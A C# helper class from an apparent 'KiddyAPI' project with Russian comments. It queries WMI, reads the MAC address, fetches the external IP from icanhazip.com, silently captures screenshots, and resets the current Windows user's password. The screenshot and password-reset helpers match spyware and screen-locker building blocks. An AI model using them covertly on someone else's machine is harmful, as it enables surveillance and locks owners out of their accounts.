using System;
using System.Collections.Generic;
using System.DirectoryServices.AccountManagement;
using System.Drawing;
using System.Linq;
using System.Management;
using System.Net;
using System.Net.NetworkInformation;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace KiddyAPI.Info
{
    public class SystemWork
    {
        /// <summary>
        /// Получаем информацию о каком то модуле
        /// </summary>
        /// <param name="WinClass">Класс WMI</param>
        /// <param name="ClassItem">Имя в классе</param>
        /// <returns>Возвращает List<string> информации о заданном модуле</returns>
        public static List<string> GetInfo(string WinClass, string ClassItem)
        {

            List<string> result = new List<string>();
            ManagementObjectSearcher searcher = new ManagementObjectSearcher("SELECT * FROM " + WinClass);
            try
            {
                foreach (ManagementObject obj in searcher.Get())
                {
                    result.Add(obj[ClassItem].ToString().Trim());
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
            }
            return result;
        }
        /// <summary>
        /// Получаем MAC адрес, возвращает без двоеточий
        /// </summary>
        /// <returns>MAC адресс Etherner адаптера</returns>
        public static string GetMacAddress()
        {
            foreach (NetworkInterface nic in NetworkInterface.GetAllNetworkInterfaces())
            {
                
                if (nic.NetworkInterfaceType == NetworkInterfaceType.Ethernet &&
                    nic.OperationalStatus == OperationalStatus.Up)
                {
                    return nic.GetPhysicalAddress().ToString();
                }
            }
            return null;
        }
        /// <summary>
        /// Получаем внешний IP адресс
        /// </summary>
        /// <returns>Возвращает IP в значении string</returns>
        public static string GetIP()
        {
            string IP = new WebClient().DownloadString("http://icanhazip.com/");
            return IP;
        }
        /// <summary>
        /// Делаем скриншот экрана
        /// </summary>
        /// <param name="path">Куда сохранять скрин</param>
        public static void GetScreen(string path)
        {
            var scrn = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
            var graphics = Graphics.FromImage(scrn as Image);
            graphics.CopyFromScreen(0, 0, 0, 0, scrn.Size);
            var img = scrn;
            img.Save(path);
        }

        /// <summary>
        /// Меняем пароль Windows
        /// </summary>
        /// <param name="pass">Новый пароль</param>
        public static void ChangeWinPass(string pass)
        {
            PrincipalContext context = new PrincipalContext(ContextType.Machine);
            UserPrincipal currentUser = UserPrincipal.FindByIdentity(context, IdentityType.SamAccountName, Environment.UserName);
            currentUser.SetPassword(pass);
            
        }
    }
}
